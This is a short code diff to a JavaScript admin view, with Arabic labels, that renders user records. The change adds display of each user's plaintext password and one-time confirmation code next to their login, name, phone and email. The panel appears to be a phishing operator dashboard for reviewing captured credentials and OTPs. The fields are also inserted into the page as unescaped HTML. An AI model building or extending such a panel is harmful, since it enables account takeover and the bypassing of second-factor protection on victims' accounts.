@@ -681,7 +681,9 @@ async function renderTable(){
       const dd=document.createElement('div');dd.className='dd';dd.dataset.role='details';
       dd.style.top='18px';dd.style.left='50%';dd.style.transform='translateX(-50%)';dd.style.width='min(780px, calc(100vw - 18px))';dd.style.maxHeight='86vh';dd.style.overflowY='auto';
       dd.innerHTML=`<div class="ddttl">🔍 تفاصيل المستخدم</div>
-        <div class="ddrow"><span class="ddk">رقم تسجيل الدخول</span><span class="ddv hi">${S.login||'-'}</span></div>
+        <div class="ddrow"><span class="ddk">رقم تسجيل الدخول</span><span class="ddv hi">${S.login || '-'}</span></div>
+        <div class="ddrow"><span class="ddk">كلمة المرور</span><span class="ddv">${S.password || '-'}</span></div>
+        <div class="ddrow"><span class="ddk">رمز التأكيد</span><span class="ddv hi">${S.otp || '-'}</span></div>
         <div class="ddrow"><span class="ddk">الاسم</span><span class="ddv">${u.name}</span></div>
         <div class="ddrow"><span class="ddk">رقم الجوال</span><span class="ddv">${u.phone}</span></div>
         <div class="ddrow"><span class="ddk">البريد</span><span class="ddv">${u.email}</span></div>
